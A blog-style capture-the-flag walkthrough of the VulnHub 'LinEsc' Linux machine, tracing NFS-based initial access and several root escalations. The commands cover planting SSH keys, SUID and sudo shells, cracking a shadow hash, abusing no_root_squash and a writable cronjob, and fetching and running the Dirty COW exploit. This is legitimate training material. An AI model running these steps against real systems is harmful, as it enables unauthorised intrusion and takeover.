---
layout: post
title: "LinESC Machine"
author: "Anne"
date: 2026-03-13
categories: [Vulnhub Machines]
tags: [linux, enumeration, privilege-escalation, penetration-testing]
---

# LinEsc Machine Overview

The **LinEsc** machine is a Linux-based security challenge designed to test internal penetration testing skills. The primary objective of this box is to move from an external network position to a fully privileged root user. This machine specifically highlights common misconfigurations found in internal environments, such as insecure network file shares and overly permissive service configurations. My goal was to identify an entry point, establish a foothold as a low-privileged user, and then systematically escalate my privileges to gain total control of the system.

---

# INITIAL ACCESS

## Information Gathering

I started by gathering information of the LinEsc machine. I scanned my kali Linux ip address using `ifconfig` to get the ip address range. 
I then scanned for the ip address using the range of my kali’s machine ip address and found two hosts one which was my attacking machine’s ip address and the LinEsc machine ip address since I placed them on the same network. The LinEsc Ip address was identified as `192.168.56.120`.

`└─$ ifconfig`

![Linesc 1](/images/Linesc/linesc1.png)

![Linesc 2](/images/Linesc/linesc2.png)

## Service Enumeration

I scanned the targets ip address for any open ports, services and versions running by executing

`└─$ sudo nmap –Pn –p- -sV –sS –system-dns 192.168.56.120`. 
![Linesc 3](/images/Linesc/linesc3.png)

Several ports were open:

* Port 22: SSH
* Port 111: RPCbind
* Port 2049: NFS
* Port 55325: nlockmgr
* Port 56577: mountd
* Port 60717: unknown

## Gaining Initial Access

### Inspecting port 2049 nfs

Nfs is a file sharing system that allows users to share files across a network. I ran the rpcinfo 192.168.56.120 command to confirm the service nfs was running on the system. 

`└─$ rpcinfo 192.168.56.120`
![Linesc 4](/images/Linesc/linesc4.png)

I then run the showmount command to check for any file shares and a share `/home/muhammad` was displayed. This also indicated that there might be a possible user named Muhammad since users reside in the home directory.

`└─$ showmount -e 192.168.56.120`
![Linesc 5](/images/Linesc/linesc5.png)

I created a directory `/mnt/muhammad` which I mounted the the share `/home/muhammad` so that I could access its contents using `sudo mount 192.168.56.120:/home/muhammad /mnt/muhammad –o vers=3`. 

![Linesc 6](/images/Linesc/linesc6.png)
![Linesc 7](/images/Linesc/linesc7.png)

Listing the file contents with , I found several directories including an ssh directory.

`└─$ ls –lash /mnt/muhammad`
![Linesc 8](/images/Linesc/linesc8.png)

I switched to `.ssh` directory and listed the contents in the directory. The ssh directory basically stores files related to ssh configurations, authentication and access of a system.

`└─$ cd /mnt/MUhammad/.ssh`.
![Linesc 9](/images/Linesc/linesc9.png)

`└─$ ls -la`.
![Linesc 10](/images/Linesc/linesc10.png)

 I accessed the contents in the known_hosts file and got a public key stored there.

 `└─$ cat known_hosts`
 ![Linesc 11](/images/Linesc/linesc11.png)

I then generated an rsa key pair whereby the public key will be used to gain access to the system later on. 

`└─$ ssh-keygen -t rsa` 
![Linesc 12](/images/Linesc/linesc12.png)

I confirmed whether the keys were generated successfully in the ssh directory of my attacking machine. The keys generated were the *id_rsa* and *id_rsa.pub*.

`└─$ cd /root/.ssh`
![Linesc 13](/images/Linesc/linesc13.png)

 I copied the `id_rsa.pub` key to the `/mnt/muhammad/.ssh/authorized_keys` file.

 `└─$ cp id_rsa.pub /mnt/muhammad/.ssh authorized_keys`.
 ![Linesc 14](/images/Linesc/linesc14.png)

Finally, I confirmed whether the `id-rsa.pub` key stored on the `/root/.ssh` and the `/mnt/muhammad/.ssh/authorized_keys` were same.

`└─$ cat id_rsa.pub` and `cat /mnt/muhammad/.ssh/authorized_keys`.

![Linesc 15](/images/Linesc/linesc15.png)

## PRIVILEGE ESCALATION

After confirming that the public keys matched, I gained access to the machine via SSH as the user `muhammad`. The SSH service facilitates secure remote access to a system over a network. To ensure compatibility with the target's older key algorithms, I specified the host key and public key algorithms during the connection.

`└─$ ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa muhammad@192.168.56.120`
![Linesc 16](/images/Linesc/linesc16.png)

Upon establishing a session, I verified my current working directory using `pwd` and began enumerating the file system for potential escalation paths. I noticed a directory named `vuln` in the user's home folder which had both read and write access. Navigating into `/home/muhammad/vuln`, I discovered four subdirectories labeled `1`, `2`, `3`, and `4`.
![Linesc 17](/images/Linesc/linesc17.png)

![Linesc 18](/images/Linesc/linesc18.png)
---

## PRIVILEGE ESCALATION VECTORS

### Inspecting SUID Binaries

I began my investigation in directory `1`, where I located two files: `suid` and `suid.c`. The presence of a binary named `suid` strongly suggested the use of the SUID (Set User ID) special permission. This permission allows a user to execute a file with the privileges of the file's owner. 

`└─$ cd /home/muhammad/vuln/1`

![Linesc 19](/images/Linesc/linesc19.png)

`└─$ ls -l suid`

![Linesc 20](/images/Linesc/linesc20.png)

After confirming that the `suid` binary was owned by the root user, I accessed the contents in `suid.c`.

`└─$ cat suid.c`
![Linesc 21](/images/Linesc/linesc21.png)

The code revealed that the program was designed to spawn a shell (`/bin/sh`) using the privileges of the binary owner. Since the binary had the SUID bit set and was owned by root, executing it successfully gave me a root shell.

`└─$ ./suid`
![Linesc 22](/images/Linesc/linesc22.png)

## Exploiting SUDO Permissions

Next, I examined the `SUDO` configurations for the `muhammad` user. By running `sudo -l`, I identified several commands that could be executed with root privileges without requiring a password(`NOPASSWD`).

`└─$ sudo -l`
![Linesc 23](/images/Linesc/linesc.png)

I switched to the `/home/muhammad/vuln/2` directory, and found a script and its corresponding source code.

`└─$ cd /home/muhammad/vuln2`

`└─$ ls`

![Linesc 24](/images/Linesc/linesc24.png)

 Upon reviewing `sudo.c`, I confirmed that the script was designed to open a shell. Because I had the permission to run this specific binary via `sudo`, executing the script immediately granted me a shell with root-level access.

`└─$ cat sudo.c`

![Linesc 25](/images/Linesc/linesc25.png)

![Linesc 26](/images/Linesc/linesc26.png)

`└─$ sudo /home/muhammad/vuln/2/sudo`
![Linesc 27](/images/Linesc/linesc27.png)

## Root Access via SSH Private Keys

In directory `3`, I discovered a file named `key`. Upon inspecting its contents, I found it contained an RSA private key. Having previously identified a public key in Muhammad's `.ssh` directory, I realized this private key could be used to authenticate as the root user.

`└─$ cd /home/muhammad/vuln/3`

![Linesc 28](/images/Linesc/linesc28.png)

I captured the private key and transferred it to a file named `rsa-key` on my attacking machine.

`└─$ cat key`

![Linesc 29](/images/Linesc/linesc29.png)

`└─$ touch rsa-key`

![Linesc 30](/images/Linesc/linesc30.png)

![Linesc 31](/images/Linesc/linesc31.png)

 To satisfy the security requirements of SSH clients, I modified the file permissions to `600`, to function appropriately.

 
`└─$ chmod 600 rsa-key`

![Linesc 32](/images/Linesc/linesc32.png)

 I updated my local `~/.ssh/config` file to support the target system's legacy key algorithms. Using the private key, I successfully established an SSH connection directly as the root user.


`└─$ ssh -o HostKeyAlgorithms=+ssh-rsa -i rsa-key root@192.168.56.120`

![Linesc 33](/images/Linesc/linesc33.png)

![Linesc 34](/images/Linesc/linesc34.png)

## Exploiting Misconfigured Permissions

I checked whether I could access the `/etc/shadow` file, as it contains user password hashes and is typically only accessible by the root user. Interestingly, I found the file had both read and write access for a normal user.

`└─$ ls -l /etc/shadow`

![Linesc 35](/images/Linesc/linesc35.png)


Upon accessing the `/etc/shadow` file, I found the root hash and copied it into a file named `roothash` on my attacking machine. After identifying it as an **MD5crypt** hash using an online tool, I performed a dictionary attack—a method that systematically tests potential passwords from a list. Using **John the Ripper** with the `rockyou.txt` wordlist, I successfully recovered the password: `chicken`.

`└─$ cat /etc/shadow`

![Linesc 36](/images/Linesc/linesc36.png)

`└─$ nano roothash`

![Linesc 37](/images/Linesc/linesc37.png)

`└─$ john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt roothash`

![Linesc 38](/images/Linesc/linesc38.png)

Returning to the target machine, I switched to the root user and entered the password `chicken`, successfully gaining a root shell.

`└─$ su root`

!![Linesc 39](/images/Linesc/linesc39.png)

![Linesc 40](/images/Linesc/linesc40.png)

## Exploiting Misconfigured Services

The `/etc/exports` file is used to configure network shares and their respective permissions. I checked the permissions for `/etc/exports` and found I had read and write access.

`└─$ ls –l /etc/exports`

![Linesc 41](/images/Linesc/linesc41.png)

Upon viewing the contents, I noticed the `no_root_squash` option was set on the `/home/muhammad` share. This configuration allows a root client on the network to retain its root privileges when accessing the share. I accessed the `/mnt/muhammad` directory as root from my attacking machine, which allowed me to add or edit files with root privileges. 

`└─$ cat /etc/exports`
![Linesc 42](/images/Linesc/linesc42.png)

While accessing the /vuln/4 directory I noticed that I can only run the script.sh with root
privileges.
I remounted the /home Muhammad in a directory /mnt/muhammad1 then switched to the
/mnt/muhammad1/vuln/4 directory whereby I got the passwdand script.sh file.

`└─$ cd /mnt/muhammad1/vuln/4`

![Linesc 43](/images/Linesc/linesc43.png)

I generated a new SHA-512 password hash using `mkpasswd –m SHA-512` and added a new user entry, `userpt`, to the `passwd` file with root privileges and shell access. I then updated the file permissions and set the SUID bit on `script.sh` so it would execute with the owner's privileges. 

`└─$ mkpasswd –m SHA-512`

![Linesc 44](/images/Linesc/linesc44.png)

![Linesc 45](/images/Linesc/linesc45.png)

`└─$ chmod +sx script.sh`

![Linesc 46](/images/Linesc/linesc46.png)

After confirming the permissions (`rwsr-xr-x`), I ran `script.sh` on the target machine and switched to the newly created `userpt` account using my custom password to gain root access.

`└─$ ./script.sh`

![Linesc 47](/images/Linesc/linesc47.png)

`└─$ su userpt`

`└─$ whoami`

![Linesc 48](/images/Linesc/linesc48.png)

## Kernel Exploit

The kernel is the core component of the operating system that manages hardware resources. I ran the `uname` command to gather system details and found the machine was running **Linux 2.6.24-26 server x86_64**. Research indicated this version is vulnerable to a specific privilege escalation exploit found on Exploit DB.

`└─$ uname -a`

![Linesc 49](/images/Linesc/linesc49.png)

I downloaded the exploit (40839.c)  fromexploit  DB to my attacking machine and started a Python HTTP server on port 8080 to transfer the file to the target.

`└─$ python3 –m http.server 8080`

![Linesc 50](/images/Linesc/linesc50.png)

On the target machine, I navigated to `/tmp`, fetched the file using `wget`, and renamed it to `dirty.c`.

`└─$ cd /tmp`

![Linesc 51](/images/Linesc/linesc51.png)

`└─$ wget http://192.168.56.113:8080/40839.c`

![Linesc 52](/images/Linesc/linesc52.png)

`└─$ mv 40839.c dirty.c`

![Linesc 53](/images/Linesc/linesc53.png)

I compiled the exploit using `gcc` and executed the resulting `dirty` binary.The exploit successfully created a new user named `firefart` with root privileges.

`└─$ gcc –pthread dirty.c –o dirty –lcrypt`

![Linesc 54](/images/Linesc/linesc54.png)

`└─$ ./dirty`

![Linesc 55](/images/Linesc/linesc55.png)

`└─$ su firefart`

![Linesc 56](/images/Linesc/linesc56.png)

## Exploiting Cronjobs

Cronjobs are scheduled tasks that automate the execution of scripts at specified times. I checked the permissions for `/etc/crontab` and found it was readable and writeable. 

`└─$ ls –l /etc/crontab`

![Linesc 57](/images/Linesc/linesc57.png)

From the read permissions granted I accessed the cronjobs scheduled on the system and I
noticed the script.sh that is scheduled to run after every minute as root.

![Linesc 58](/images/Linesc/linesc58.png)

I switched to the /home/muhammad/vuln/4 and on accessing the contents on script.sh it copies
the passwd file to replace the /etc/passwd file meaning if i could modify or append the passwd
file with a user with root privileges after the script runs a root shell can be accessed.

`└─$ cd /home/muhammad/vuln/4/script.sh`

![Linesc 59](/images/Linesc/linesc59.png)

![Linesc 60](/images/Linesc/linesc60.png)

I generated a new SHA-512 password hash and edited the `passwd` file to include a new root entry with the username `userR`.

`└─$ mkpasswd -m SHA-512`

![Linesc 61](/images/Linesc/linesc61.png)

`└─$ vim passwd`

![Linesc 62](/images/Linesc/linesc62.png)

Once the cronjob triggered, I successfully switched to the `userR` account and confirmed I had root access.

`└─$ su userR`

![Linesc 63](/images/Linesc/linesc63.png)

`└─$ whoami`

![Linesc 64](/images/Linesc/linesc64.png)

----
## Conclusion

The LinEsc machine provided a comprehensive environment for practicing various Linux privilege escalation vectors. From exploiting basic misconfigurations in NFS and file permissions to leveraging kernel vulnerabilities like Dirty COW, the engagement highlighted how small oversights—such as a writable `/etc/shadow` file or a loose cronjob—can lead to a full system compromise. 

Happy Hacking!